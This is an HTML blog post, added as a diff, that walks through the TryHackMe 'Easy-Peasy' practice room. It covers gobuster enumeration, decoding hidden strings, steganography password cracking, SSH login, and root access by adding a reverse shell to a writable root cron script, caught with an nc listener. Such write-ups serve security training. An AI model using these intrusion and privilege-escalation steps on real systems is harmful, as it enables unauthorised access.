@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Writeup - Easy-Peasy" /><meta name="author" content="Fr3akazo1d!" /><meta property="og:locale" content="en_US" /><meta name="description" content="Walkthrough of Easy-Peasy of TryHackme" /><meta property="og:description" content="Walkthrough of Easy-Peasy of TryHackme" /><link rel="canonical" href="protocol://domain/posts/THM-EasyPeasy-Writeup/" /><meta property="og:url" content="protocol://domain/posts/THM-EasyPeasy-Writeup/" /><meta property="og:site_name" content="Fr3akazo1d!" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-12T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup - Easy-Peasy" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Fr3akazo1d!" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"url":"protocol://domain/posts/THM-EasyPeasy-Writeup/","description":"Walkthrough of Easy-Peasy of TryHackme","mainEntityOfPage":{"@type":"WebPage","@id":"protocol://domain/posts/THM-EasyPeasy-Writeup/"},"@type":"BlogPosting","headline":"Writeup - Easy-Peasy","dateModified":"2020-10-12T00:00:00+02:00","datePublished":"2020-10-12T00:00:00+02:00","author":{"@type":"Person","name":"Fr3akazo1d!"},"@context":"https://schema.org"}</script><title>Writeup - Easy-Peasy | Fr3akazo1d!</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"> <center><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/freakazoid.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/"><p>Fr3akazo1d!</p></a></div><div class="site-subtitle font-italic"><p>Pen-Testing, Ethical Hacking, Programming.</p></div></div></center></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tools/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-link ml-xl-3 mr-xl-3 unloaded"></i> <span>TOOLS & LINKS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/fr3akazo1d" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fr3akazo1d','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Writeup - Easy-Peasy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup - Easy-Peasy</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 12, 2020, 12:00 AM +0200" > Oct 12 <i class="unloaded">2020-10-12T00:00:00+02:00</i> </span> by <span class="author"> Fr3akazo1d! </span></div></div><div class="post-content"><h1 id="walkthrough">Walkthrough</h1><p>Used gobuster</p><ul><li><div class="table-wrapper"><table><tbody><tr><td>gobuster dir -u http://10.10.201.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<td>tee gobuster-output.txt</table></div></ul><p>found hidden directory</p><p>after researching the site, nothing interesting was found on the website.</p><p>But for the answer of TryHackMe, something has to be on the site. So i keep digging around on the webserver.</p><p>I tried another gobuster run on the hidden directory.</p><p>Found another directory. Was another picture and then i checked the source code. In the Source code there was a hidden paragraph:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;center&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">hidden</span><span class="nt">&gt;</span>Z**********************=<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/center&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>No i have my first flag, the code was Base64. we can decode the base64 string in the terminal:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>fr3akazo1d㉿fr3ak0ut<span class="o">)</span>-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
+└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"************************"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
+flag<span class="o">{</span>f<span class="k">********</span>g<span class="o">}</span>
+</pre></table></code></div></div><p>After a lot of seraching on Port 80 on the Server, i was swtiching to the other Webserver witch is running on port 65524.</p><p>On this webserver i also run a gobuster run, and found robots.txt file. looked inside the robots.txt file and found a hash.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+</pre></table></code></div></div><p>The hash was crackable with only one website. after decypting the hash we got our second flag.</p><p>On The apache website there is the third flag locatet, we have to look closely. :)</p><p>For the hidden directory. i was going through the source code of the apache server. i found an interessting part with a string who looks like a hash:</p><p hidden="">its encoded with ba....:O**********************u</p><p>i was triying to decrypt the hash with base64, but it was no base64 hash. I tried different ways till i found the right base decoder. The string gave me the name of the hidden directory.</p><p>http://10.10.249.230:65524/n<strong>**</strong><strong>**</strong>***r/</p><p>on this page we found another hash. Whitch we have to decrpt. Also a picture was provided on this site.</p><p>Downloaded the picture and started brute force attack on the picture with the txt file which we have donwloaded from tryhackem.</p><p>a other way is to crack the password with hashcat, as a hint from tryhackme. the has is GOST.</p><p>The txt file was containg the password, and extracted a new text file where a username and password was stored.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>fr3akazo1d㉿fr3ak0ut<span class="o">)</span>-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
+└─<span class="nv">$ </span>s<span class="k">**********</span> binarycodepixabay.jpg easypeasy.txt                                                               1 ⨯
+S<span class="k">**********</span> 2.0.9 - <span class="o">(</span>https://github.com/Paradoxis/s<span class="k">**********</span><span class="o">)</span>
+Copyright <span class="o">(</span>c<span class="o">)</span> 2020 - Luke Paris <span class="o">(</span>Paradoxis<span class="o">)</span>
+
+Counting lines <span class="k">in </span>wordlist..
+Attacking file <span class="s1">'binarycodepixabay.jpg'</span> with wordlist <span class="s1">'easypeasy.txt'</span>..
+Successfully cracked file with password: m<span class="k">******************</span>b
+Tried 3585 passwords
+Your file has been written to: binarycodepixabay.jpg.out
+m<span class="k">******************</span>b
+</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>bat binarycodepixabay.jpg.out 
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: binarycodepixabay.jpg.out
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ username:b<span class="k">****</span>g
+   2   │ password:
+   3   │ 01101001 <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">*</span>
+       │ <span class="k">*******</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">********</span> <span class="k">**</span>
+       │ <span class="k">******</span> <span class="k">********</span> <span class="k">********</span> 01111001
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</pre></table></code></div></div><p>The password was decoded in binary. after decoding we have now the password for the user to the target.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>i<span class="k">**************************</span>y
+</pre></table></code></div></div><p>We can now login with the user and read the user.txt file.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>fr3akazo1d㉿fr3ak0ut<span class="o">)</span>-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
+└─<span class="nv">$ </span> ssh 10.10.249.230 <span class="nt">-p</span> 6498 <span class="nt">-l</span> b<span class="k">****</span>g <span class="nt">-p</span> i<span class="k">**************************</span>y
+<span class="k">*************************************************************************</span>
+<span class="k">**</span>        This connection are monitored by government offical          <span class="k">**</span>
+<span class="k">**</span>            Please disconnect <span class="k">if </span>you are not authorized        <span class="k">**</span>
+<span class="k">**</span> A lawsuit will be filed against you <span class="k">if </span>the law is not followed      <span class="k">**</span>
+<span class="k">*************************************************************************</span>
+b<span class="k">****</span>g@10.10.249.230<span class="s1">'s password: 
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+b****g@kral4-PC:~$ ls
+user.txt
+b****g@kral4-PC:~$ cat user.txt 
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+s**t{a**************y}
+</span></pre></table></code></div></div><p>After some researching i came a cross the cronjob.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>b<span class="k">****</span>g@kral4-PC:/<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab 
+<span class="c"># /etc/crontab: system-wide crontab</span>
+<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
+<span class="c"># command to install the new version when you edit this file</span>
+<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c"># that none of the other crontabs do.</span>
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span class="c"># m h dom mon dow user  command</span>
+17 <span class="k">*</span>  <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
+25 6  <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root  <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
+47 6  <span class="k">*</span> <span class="k">*</span> 7 root  <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
+52 6  1 <span class="k">*</span> <span class="k">*</span> root  <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
+<span class="c">#</span>
+<span class="k">*</span> <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> /var/www/ <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>bash .mysecretcronjob.sh
+</pre></table></code></div></div><p>on cronjob is running as root. I added a reverse shell to the file and a listener on my machine.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>b<span class="k">****</span>g@kral4-PC:/<span class="nv">$ </span>nano var/www/.mysecretcronjob.sh 
+</pre></table></code></div></div><h1 id="root-shell">root shell</h1><p>After some seconds i got a root shell. now we can read the root.txt file</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>fr3akazo1d㉿fr3ak0ut<span class="o">)</span>-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
+└─<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 8080
+listening on <span class="o">[</span>any] 8080 ...
+connect to <span class="o">[</span>10.9.170.39] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.249.230] 53294
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1509<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@kral4-PC:/var/www# <span class="nb">cat </span>root.txt  
+<span class="nb">cat </span>root.txt 
+flag<span class="o">{</span>6<span class="k">******************************</span>5<span class="o">}</span>
+root@kral4-PC:~# 
+</pre></table></code></div></div><p>summary</p><p>This box was a lot enumeration with gobuster. Sometimes i was stucked at this. I tried some different ways but i was really fustrated that i read another writeup for the room.</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackeme/" class="post-tag no-text-decoration" >TryHackeMe</a> <a href="/tags/easypeasy/" class="post-tag no-text-decoration" >EasyPeasy</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >Hacking</a> <a href="/tags/pwned/" class="post-tag no-text-decoration" >pwned</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/gobuster/" class="post-tag no-text-decoration" >gobuster</a> <a href="/tags/steganography/" class="post-tag no-text-decoration" >steganography</a> <a href="/tags/cronjob/" class="post-tag no-text-decoration" >cronjob</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Writeup - Easy-Peasy - Fr3akazo1d!&url=protocol://domain/posts/THM-EasyPeasy-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Writeup - Easy-Peasy - Fr3akazo1d!&u=protocol://domain/posts/THM-EasyPeasy-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Writeup - Easy-Peasy - Fr3akazo1d!&url=protocol://domain/posts/THM-EasyPeasy-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pwned/">pwned</a> <a class="post-tag" href="/tags/hacking/">Hacking</a> <a class="post-tag" href="/tags/tryhackeme/">TryHackeMe</a> <a class="post-tag" href="/tags/cronjob/">cronjob</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/security/">Security</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm-Tartarus-Writeup/"><div class="card-body"> <span class="timeago small" > Oct 27 <i class="unloaded">2020-10-27T23:14:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup - Tartarus</h3><div class="text-muted small"><p> General Information Room Date Difficulty Tags Time Tartarus 25.10.2020 Easy Security, ctf, dirbuster, tartarus ...</p></div></div></a></div><div class="card"> <a href="/posts/thm-Anonymous-Writeup/"><div class="card-body"> <span class="timeago small" > Sep 28 <i class="unloaded">2020-09-28T00:14:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup - Anonymous</h3><div class="text-muted small"><p> General Information Room Date Difficulty Tags Time Anonymous 27.09.2020 Medium Security, linux, permissions, medium ...</p></div></div></a></div><div class="card"> <a href="/posts/THM-Anthem-Writeup/"><div class="card-body"> <span class="timeago small" > Oct 3 <i class="unloaded">2020-10-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup - Anthem</h3><div class="text-muted small"><p> Difficulty: Easy TryHackMe-Tags: Windows, CMS, enumeration, Weekly Challange This Room is about a Web-Server where we have to find different flags, usernames and possible Passwords on the Web-Ser...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/THM-Brooklyn-NineNine-Writeup/" class="btn btn-outline-primary"><p>Writeup - Brooklyn- NineNine</p></a> <a href="/posts/THM-What-A-Shell/" class="btn btn-outline-primary"><p>What the Shell</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com">Fr3akazo1d!</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> The quieter you become the more you are able to hear!</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pwned/">pwned</a> <a class="post-tag" href="/tags/hacking/">Hacking</a> <a class="post-tag" href="/tags/tryhackeme/">TryHackeMe</a> <a class="post-tag" href="/tags/cronjob/">cronjob</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/security/">Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="protocol://domain{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
